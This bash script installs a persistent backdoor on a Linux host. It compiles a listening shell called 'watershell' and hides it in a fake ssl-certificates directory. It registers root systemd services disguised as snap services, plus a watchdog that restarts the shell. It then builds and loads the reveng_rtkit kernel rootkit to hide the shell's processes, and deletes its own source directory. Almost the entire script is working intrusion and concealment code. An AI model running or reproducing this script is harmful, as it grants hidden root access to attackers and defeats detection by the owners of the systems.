#!/bin/bash

# Install necessary packages if not already installed
sudo apt-get install -y g++ python3 build-essential linux-headers-$(uname -r)

# Clone the Watershell-Cpp repository
git clone https://github.com/Dack985/Cerberus-shell.git

# Navigate to the Watershell-Cpp directory
cd Cerberus-shell

# Compile the Watershell-Cpp code
g++ main.cpp watershell.cpp -o watershell

# Verify if Watershell binary is compiled successfully
if [ -x "./watershell" ]; then
    echo "Watershell binary compiled successfully."

    # Create ssl-certificates directory in /usr/local/share
    sudo mkdir -p /usr/local/share/ssl-certificates

    # Copy Watershell-Cpp files to the ssl-certificates directory
    sudo cp -R * /usr/local/share/ssl-certificates

    # Change ownership of the ssl-certificates folder and its contents to the "root" user
    sudo chown -R root:root /usr/local/share/ssl-certificates

    # Create the startup script (cerberus_shell.sh) in ssl-certificates directory
    cat <<EOF | sudo tee '/usr/local/share/ssl-certificates/cerberus_shell.sh' > /dev/null
#!/bin/bash
cd /usr/local/share/ssl-certificates
while true; do
    ./watershell -l 10000 eth0
    sleep 1
done
EOF

    # Make the startup script executable
    sudo chmod +x '/usr/local/share/ssl-certificates/cerberus_shell.sh'

    # Create the systemd service unit file (cerberus.service)
    cat <<EOF | sudo tee '/etc/systemd/system/snap-snapd-21445.service' > /dev/null
[Unit]
Description=Cerberus Shell Startup

[Service]
ExecStart=/usr/local/share/ssl-certificates/cerberus_shell.sh
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

    # Create the Python monitoring script (cerberus_monitor.py)
    cat <<EOF | sudo tee '/usr/local/bin/cerberus_monitor.py' > /dev/null
#!/usr/bin/env python3

import subprocess
import time

def check_cerberus_process():
    while True:
        try:
            subprocess.run(["pgrep", "-f", "watershell -l 10000 eth0"], check=True)
        except subprocess.CalledProcessError:
            print("Cerberus Shell process not found. Restarting...")
            subprocess.run(["/usr/local/share/ssl-certificates/watershell", "-l", "10000", "eth0"])
        time.sleep(1)

if __name__ == "__main__":
    check_cerberus_process()
EOF

    # Make the monitoring script executable
    sudo chmod +x '/usr/local/bin/cerberus_monitor.py'

    # Create the systemd service unit file (cerberus_monitor.service)
    cat <<EOF | sudo tee '/etc/systemd/system/snap-snapd-21446.service' > /dev/null
[Unit]
Description=Monitor Cerberus Shell Process

[Service]
ExecStart=/usr/local/bin/cerberus_monitor.py
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

    # Reload systemd to pick up the new unit files
    sudo systemctl daemon-reload

    # Enable and start the services
    sudo systemctl enable snap-snapd-21445.service
    sudo systemctl start snap-snapd-21445.service
    sudo systemctl enable snap-snapd-21446.service
    sudo systemctl start snap-snapd-21446.service

    # Clone the reveng_rtkit rootkit repository
    git clone https://github.com/reveng007/reveng_rtkit.git

    # Compile and load the rootkit module
    cd reveng_rtkit/kernel_src
    make
    if sudo insmod reveng_rtkit.ko; then
        echo "Rootkit module loaded successfully."
    else
        echo "ERROR: Could not load reveng_rtkit.ko. Exiting."
        exit 1
    fi

    # Verify the character device exists (usually /dev/reveng_rtkit)
    if [ ! -e /dev/reveng_rtkit ]; then
        echo "ERROR: Character device /dev/reveng_rtkit does not exist."
        exit 1
    fi

    # Compile the usermode client
    cd ../user_src
    gcc client_usermode.c -o client_usermode

    # Set rootkit to protected mode and hide Cerberus processes
    # Using a here-doc to automate client commands without manual input
    sudo ./client_usermode <<EOF
protect
EOF

    # Hide all Cerberus and Watershell processes using their PIDs
    for pid in $(pgrep -f "watershell -l 10000 eth0"); do
        sudo kill -31 "$pid" # hide process using the rootkit
    done
    for pid in $(pgrep -f "cerberus_shell.sh"); do
        sudo kill -31 "$pid" # hide process using the rootkit
    done

    # Clean up the setup script and Cerberus-shell directory
    cd
    rm -rf Cerberus-shell

    echo "Cerberus and rootkit setup completed successfully."
else
    echo "ERROR: Watershell binary compilation failed."
    exit 1
fi
